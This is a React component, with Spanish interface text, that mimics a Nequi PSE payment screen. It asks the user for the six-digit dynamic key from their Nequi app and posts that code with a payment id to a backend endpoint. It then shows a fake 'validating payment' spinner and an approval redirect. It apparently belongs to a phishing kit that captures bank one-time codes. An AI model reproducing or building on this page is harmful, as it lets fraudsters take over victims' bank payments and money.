import { useState } from "react"
import { useNavigate, useLocation } from "react-router-dom"
import "./NequiClaveDinamica.css"
import { BASE_URL } from "../../config" // <-- Importar la URL base

function NequiClaveDinamica() {
  const [clave, setClave] = useState(["", "", "", "", "", ""])
  const [cargando, setCargando] = useState(false)
  const navigate = useNavigate()
  const location = useLocation()
  const { pagoId } = location.state || {}

  const handleDigit = (num) => {
    const idx = clave.findIndex((c) => c === "")
    if (idx !== -1) {
      const nueva = [...clave]
      nueva[idx] = num
      setClave(nueva)

      if (nueva.every((c) => c !== "")) {
        setCargando(true)
        const claveFinal = nueva.join("")

        fetch(`${BASE_URL}/actualizar-clave-dinamica`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ id: pagoId, clave_dinamica: claveFinal }),
        })
          .then((res) => res.json())
          .then(() => {
            setTimeout(() => {
              setCargando(false)
              navigate("/aprobado")
            }, 2000)
          })
          .catch((err) => {
            console.error(err)
            alert("❌ Error guardando clave dinámica")
            setCargando(false)
          })
      }
    }
  }

  const handleDelete = () => {
    const idx = clave.findLastIndex((c) => c !== "")
    if (idx !== -1) {
      const nueva = [...clave]
      nueva[idx] = ""
      setClave(nueva)
    }
  }

  return (
    <div className="nequi-container">
      <img
        src="https://logosenvector.com/logo/img/nequi-37254.png"
        alt="Nequi"
        className="nequi-logo"
      />

      <h2 className="nequi-subtitle">Pagos PSE de Nequi</h2>
      <p className="nequi-text">
        Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.
      </p>

      {cargando && (
        <div className="loading-overlay">
          <div className="spinner"></div>
          <p>Validando pago...</p>
        </div>
      )}

      <div className="clave-espacios">
        {clave.map((c, i) => (
          <span key={i} className="clave-box">
            {c ? "•" : ""}
          </span>
        ))}
      </div>

      <div className="keypad">
        {[1, 2, 3, 4, 5, 6, 7, 8, 9, "", 0, "←"].map((item, idx) =>
          item === "" ? (
            <div key={idx} className="key empty"></div>
          ) : item === "←" ? (
            <button key={idx} className="key" onClick={handleDelete}>
              ←
            </button>
          ) : (
            <button key={idx} className="key" onClick={() => handleDigit(item)}>
              {item}
            </button>
          )
        )}
      </div>

      <div className="form-actions">
        <button className="btn-cancelar" onClick={() => navigate(-1)}>
          Cancela el pago
        </button>
      </div>
    </div>
  )
}

export default NequiClaveDinamica
